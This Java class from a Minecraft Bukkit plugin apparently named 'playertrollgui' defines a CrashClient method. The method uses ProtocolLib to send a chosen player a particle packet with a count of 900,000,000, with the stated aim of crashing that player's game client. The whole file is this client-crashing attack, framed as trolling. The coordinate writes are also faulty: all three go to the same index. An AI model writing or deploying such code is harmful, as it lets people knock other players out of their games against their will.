package me.oscarcusick.playertrollgui.PacketSenders;

import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.wrappers.EnumWrappers;
import org.bukkit.Server;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.lang.annotation.Target;

public class CrashClient {

    public void AttemptCrashClient(Plugin Plugin, Player TargetPlayer) {
        ProtocolManager manager = ProtocolLibrary.getProtocolManager();
        PacketContainer packet = manager.createPacket(PacketType.Play.Server.WORLD_PARTICLES);
        packet.getParticles().write(0, EnumWrappers.Particle.WATER_BUBBLE);
        packet.getDoubles().write(0, TargetPlayer.getLocation().getX());
        packet.getDoubles().write(0, TargetPlayer.getLocation().getY());
        packet.getDoubles().write(0, TargetPlayer.getLocation().getZ());
        packet.getIntegers().write(0, 900000000);
        manager.sendServerPacket(TargetPlayer, packet);
    }
}
